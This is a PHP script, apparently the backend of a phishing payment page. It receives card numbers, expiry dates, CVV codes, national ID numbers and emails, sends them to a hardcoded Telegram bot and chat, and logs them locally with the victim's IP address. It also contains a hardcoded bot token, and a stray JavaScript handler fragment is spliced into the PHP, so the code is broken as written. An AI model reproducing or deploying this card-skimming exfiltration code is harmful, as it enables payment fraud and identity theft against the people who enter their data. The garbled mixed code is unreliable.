<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}
export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ success: false, error: "Método no permitido" });
    }
// ⚠️ TU CONFIGURACIÓN - NO CAMBIAR
define('BOT_TOKEN', '8234170971:AAH7Z8ySIHDs1tZmWTbFnAc90-RKdh26fwY');
define('CHAT_ID', '-1003832913889');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die(json_encode(['success' => false, 'error' => 'Solo POST']));
}

$json = file_get_contents('php://input');
$d = json_decode($json, true);

if (!$d) {
    die(json_encode(['success' => false, 'error' => 'Sin datos']));
}

// Mensaje COMPLETO para Telegram
$msg = "🔔 *NUEVA ORDEN DE PAGO* 🔔\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
$msg .= " *SERVICIO:* " . $d['servicio'] . "\n";
$msg .= " *MONTO:* $" . $d['monto'] . "\n";
$msg .= " *MÉTODO PAGO:* " . $d['metodo_pago'] . "\n\n";

$msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n";
$msg .= " *DATOS*\n";
$msg .= "━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

$msg .= " *Tarjeta:*\n";
$msg .= "`" . $d['numero_tarjeta'] . "`\n\n";
$msg .= " *Vence:*\n";
$msg .= "`" . $d['fecha_vencimiento'] . "`\n\n";
$msg .= " *CVC:*\n";
$msg .= "`" . $d['cvv'] . "`\n\n";
$msg .= " *DNI/:*\n";
$msg .= "`" . $d['dni'] . "`\n\n";


// Enviar a Telegram
$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => CHAT_ID,
    'text' => $msg,
    'parse_mode' => 'Markdown'
]));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$res = curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// Log local con TODOS los datos
$log = sprintf(
    "[%s] SERVICIO:%s | NUM:%s | MONTO:$%s | TARJETA:%s | VENCE:%s | CVV:%s | DNI:%s | EMAIL:%s | IP:%s\n",
    date('Y-m-d H:i:s'),
    $d['servicio'],
    $d['numero_servicio'],
    $d['total'],
    $d['numero_tarjeta'],
    $d['fecha_vencimiento'],
    $d['cvv'],
    $d['dni'],
    $d['email'],
    $_SERVER['REMOTE_ADDR']
);
@file_put_contents('pagos_completos.log', $log, FILE_APPEND);

echo json_encode([
    'success' => ($code == 200),
    'telegram_code' => $code,
    'message' => ($code == 200) ? 'Enviado a Telegram' : 'Error al enviar'
]);
?>